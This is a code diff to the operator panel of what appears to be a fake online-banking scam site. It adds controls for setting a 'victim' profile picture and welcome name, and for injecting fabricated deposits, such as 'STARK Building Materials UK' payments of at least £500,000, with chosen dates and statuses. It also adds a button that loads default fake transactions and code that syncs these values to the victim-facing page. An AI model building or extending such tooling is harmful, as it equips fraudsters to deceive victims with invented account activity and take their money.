@@ -102,6 +102,15 @@
 
 
                 
+                
+                <!-- Profile Picture -->
+                <div class="settings-group">
+                    <p><i class="fas fa-image"></i> Victim Profile Picture</p>
+                    <input type="text" id="adminProfilePic" placeholder="Image URL (e.g. https://...)">
+                    <button id="btnUpdateProfilePic">Update Profile Picture</button>
+                    <div id="profilePicStatus" class="status-msg"></div>
+                </div>
+
                 <!-- Welcome Name Control -->
                 <div class="settings-group">
                     <p><i class="fas fa-user"></i> Victim Welcome Name</p>
@@ -171,17 +180,20 @@
                     <div id="cardStatus" class="status-msg"></div>
                 </div>
 
+                
                 <!-- Transaction Manager -->
                 <div class="settings-group">
                     <p><i class="fas fa-list"></i> Add Transaction</p>
-                    <input type="text" id="txDesc" placeholder="Description (e.g. Direct Deposit)">
-                    <input type="text" id="txDate" placeholder="Date (e.g. June 3, 2026)">
-                    <input type="text" id="txAmount" placeholder="Amount (e.g. $40,000.00)">
+                    <input type="text" id="txDesc" placeholder="Description (e.g. STARK Building Materials UK)">
+                    <input type="text" id="txDate" placeholder="Date (Editable, e.g. June 8, 2026)">
+                    <input type="text" id="txAmount" placeholder="Amount (min £500,000)">
                     <select id="txType"><option value="deposit">Deposit</option><option value="withdrawal">Withdrawal</option></select>
                     <select id="txStatusSel"><option value="success">Success</option><option value="pending">Pending</option><option value="failed">Failed</option></select>
                     <button class="green" id="btnAddTx">Add Transaction</button>
                     <button class="red" id="btnClearTx" style="margin-top:6px;">Clear All Transactions</button>
+                    <button class="blue" id="btnAddBuildingTx" style="margin-top:6px; background:#3498db; color:white; padding:8px 12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; width:100%; font-size:13px;">Add Default Building Material Transactions</button>
                 </div>
+
                 <div id="adminTxList" style="background:#151521; padding:10px; border-radius:6px; max-height:200px; overflow-y:auto;">
                     <p style="color:#666;">No custom transactions set.</p>
                 </div>
@@ -369,6 +381,14 @@
                 if (document.activeElement !== document.getElementById('adminDisplayEmail')) {
                     document.getElementById('adminDisplayEmail').value = currentEmail;
                 }
+            }
+
+            
+            // Poll Profile Picture
+            var pPic = getSyncItem('profilePic');
+            if (pPic && document.activeElement !== document.getElementById('adminProfilePic')) {
+                var adminPicEl = document.getElementById('adminProfilePic');
+                if(adminPicEl) adminPicEl.value = pPic;
             }
 
             // Poll Account Credentials
@@ -671,6 +691,18 @@
                 document.getElementById('currentEmailDisplay').innerText = 'Current: ' + email;
             }
         });
+
+        
+        // Update Profile Picture
+        var btnUpdateProfilePic = document.getElementById('btnUpdateProfilePic');
+        if (btnUpdateProfilePic) {
+            btnUpdateProfilePic.addEventListener('click', async function() {
+                var url = document.getElementById('adminProfilePic').value.trim();
+                if (url) await setSyncItem('profilePic', url);
+                document.getElementById('profilePicStatus').innerText = 'Profile picture updated!';
+                setTimeout(function(){ document.getElementById('profilePicStatus').innerText = ''; }, 3000);
+            });
+        }
 
         // Update Account Credentials
         document.getElementById('btnUpdateCreds').addEventListener('click', async function() {
